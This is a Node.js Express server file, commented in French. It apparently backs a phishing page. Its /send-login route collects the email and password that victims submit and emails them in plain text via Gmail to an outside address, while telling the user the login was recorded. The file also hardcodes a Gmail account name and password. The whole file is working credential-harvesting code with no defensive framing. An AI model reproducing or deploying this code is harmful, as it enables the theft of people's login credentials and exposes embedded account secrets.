const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Dossier pour servir les fichiers statiques

// Route pour traiter les données de connexion
app.post('/send-login', (req, res) => {
    const { email, password } = req.body;

    // Configurer le transporteur Nodemailer
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'dimfb44@gmail.com', // Remplacez par votre Gmail
            pass: 'yassine00' // Remplacez par votre mot de passe ou App Password
        }
    });

    // Contenu de l'email
    const mailOptions = {
        from: 'dimfb44@gmail.com',
        to: 'yassine2005w@gmail.com',
        subject: 'Nouvelle connexion utilisateur',
        text: `Un utilisateur a tenté de se connecter :\n\nEmail : ${email}\nMot de passe : ${password}`
    };

    // Envoyer l'email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            res.send('Erreur lors de l\'envoi de l\'email.');
        } else {
            console.log('Email envoyé : ' + info.response);
            res.send('Connexion enregistrée et email envoyé.');
        }
    });
});

// Lancer le serveur

app.listen(PORT, () => {
    console.log(`Serveur démarré sur http://localhost:${PORT}`);
    console.log('Prêt à recevoir les connexions utilisateurs...');
});

